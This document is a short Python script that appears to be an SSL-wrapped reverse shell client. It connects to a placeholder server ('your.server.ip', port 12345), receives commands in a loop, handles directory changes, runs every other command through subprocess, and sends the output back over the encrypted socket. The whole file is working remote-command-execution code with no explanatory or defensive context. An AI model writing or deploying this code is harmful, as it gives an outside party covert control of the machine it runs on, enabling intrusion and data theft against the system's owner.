import socket
import ssl
import os
import subprocess

# Configuration for SSL
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.load_verify_locations('server.crt')  # Server's certificate

def connect_to_server():
    server_ip = 'your.server.ip'
    server_port = 12345

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    secure_sock = context.wrap_socket(sock, server_hostname=server_ip)
    secure_sock.connect((server_ip, server_port))

    try:
        while True:
            # Receive command from the server
            command = secure_sock.recv(4096).decode()
            
            if command.lower() == 'exit':
                break
            elif command.startswith('cd '):
                # Change directory
                try:
                    os.chdir(command[3:])
                    secure_sock.send(b'Changed directory')
                except FileNotFoundError:
                    secure_sock.send(b'Error: Directory not found')
            else:
                try:
                    # Execute command and send the output
                    output = subprocess.getoutput(command)
                    secure_sock.send(output.encode())
                except Exception as e:
                    secure_sock.send(f'Error: {str(e)}'.encode())

    finally:
        secure_sock.close()

if __name__ == "__main__":
    connect_to_server()
